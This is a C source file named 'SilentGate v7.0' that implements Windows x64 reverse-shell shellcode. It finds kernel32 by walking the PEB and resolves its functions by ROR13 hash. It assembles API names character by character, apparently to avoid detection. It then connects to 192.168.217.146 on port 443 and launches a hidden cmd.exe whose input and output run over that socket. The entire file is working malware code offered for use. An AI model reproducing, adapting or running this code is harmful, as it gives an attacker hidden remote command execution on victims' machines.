/*
 * SilentGate v7.0 - Verified shellcode in C
 * Author: JarDani
 * Uses verified offsets from find_offsets test
 * PEB walk: 2 flinks, offset 0x20 for DllBase
 */
#include <windows.h>
#include <stdio.h>

typedef UINT    (WINAPI *pWinExec)(LPCSTR, UINT);
typedef SOCKET  (WINAPI *pWSASocketA)(int,int,int,LPVOID,UINT,DWORD);
typedef int     (WINAPI *pWSAStartup)(WORD, LPVOID);
typedef int     (WINAPI *pconnect)(SOCKET, const struct sockaddr*, int);
typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR,LPSTR,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);

static DWORD ror13(const char* name) {
    DWORD h = 0;
    for (const char* p = name; *p; p++) {
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF;
        h = (h + (BYTE)*p) & 0xFFFFFFFF;
    }
    return h;
}

static PVOID find_export(BYTE* base, DWORD hash) {
    DWORD pe_off  = *(DWORD*)(base + 0x3C);
    DWORD exp_rva = *(DWORD*)(base + pe_off + 0x88);
    BYTE* exp     = base + exp_rva;

    DWORD  num    = *(DWORD*)(exp + 0x18);
    DWORD* names  = (DWORD*)(base + *(DWORD*)(exp + 0x20));
    WORD*  ords   = (WORD*) (base + *(DWORD*)(exp + 0x24));
    DWORD* funcs  = (DWORD*)(base + *(DWORD*)(exp + 0x1C));

    for (DWORD i = 0; i < num; i++) {
        char* name = (char*)(base + names[i]);
        if (ror13(name) == hash)
            return base + funcs[ords[i]];
    }
    return NULL;
}

void shellcode_main() {
    /* PEB walk - verified: 2 flinks, offset 0x20 */
    BYTE* peb  = (BYTE*)__readgsqword(0x60);
    BYTE* ldr  = *(BYTE**)(peb  + 0x18);
    BYTE* list = *(BYTE**)(ldr  + 0x20);
    BYTE* e1   = *(BYTE**)list;         /* flink[0] = ntdll */
    BYTE* e2   = *(BYTE**)e1;           /* flink[1] = kernel32 */
    BYTE* k32  = *(BYTE**)(e2 + 0x20);  /* DllBase */

    /* Find GetProcAddress and LoadLibraryA */
    pGetProcAddress _GetProcAddress =
        (pGetProcAddress)find_export(k32, 0x7C0DFCAA);
    pLoadLibraryA _LoadLibraryA =
        (pLoadLibraryA)find_export(k32, 0xEC0E4E8E);

    if (!_GetProcAddress || !_LoadLibraryA) return;

    /* Load ws2_32 */
    char ws2[] = {'w','s','2','_','3','2',0};
    HMODULE ws2_32 = _LoadLibraryA(ws2);
    if (!ws2_32) return;

    /* Resolve winsock */
    char s_WSAStartup[]  = {'W','S','A','S','t','a','r','t','u','p',0};
    char s_WSASocketA[]  = {'W','S','A','S','o','c','k','e','t','A',0};
    char s_connect[]     = {'c','o','n','n','e','c','t',0};
    char s_CreateProcessA[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0};
    char s_WaitFor[]     = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0};

    pWSAStartup        _WSAStartup  = (pWSAStartup)       _GetProcAddress(ws2_32, s_WSAStartup);
    pWSASocketA        _WSASocketA  = (pWSASocketA)        _GetProcAddress(ws2_32, s_WSASocketA);
    pconnect           _connect     = (pconnect)           _GetProcAddress(ws2_32, s_connect);
    pCreateProcessA    _CreateProcessA = (pCreateProcessA) find_export(k32, 0x16B3FE72);
    pWaitForSingleObject _WaitFor   = (pWaitForSingleObject)find_export(k32, 0xCE05D9AD);

    if (!_WSAStartup || !_WSASocketA || !_connect) return;
    if (!_CreateProcessA || !_WaitFor) return;

    /* WSAStartup */
    BYTE wsadata[400] = {0};
    _WSAStartup(0x0202, wsadata);

    /* Create socket */
    SOCKET s = _WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (s == INVALID_SOCKET) return;

    /* Connect to 192.168.217.146:443 */
    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_port        = 0xBB01;           /* htons(443) */
    sa.sin_addr.s_addr = 0x92D9A8C0;      /* 192.168.217.146 */

    if (_connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) return;

    /* Spawn cmd.exe with socket handles */
    STARTUPINFOA si = {0};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = 0;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = {'c','m','d',0};
    _CreateProcessA(0, cmd, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi);
    _WaitFor(pi.hProcess, 0xFFFFFFFF);
}

int main() {
    printf("[SHELL] Starting verified C shellcode\n");
    shellcode_main();
    printf("[SHELL] Done\n");
    getchar();
    return 0;
}
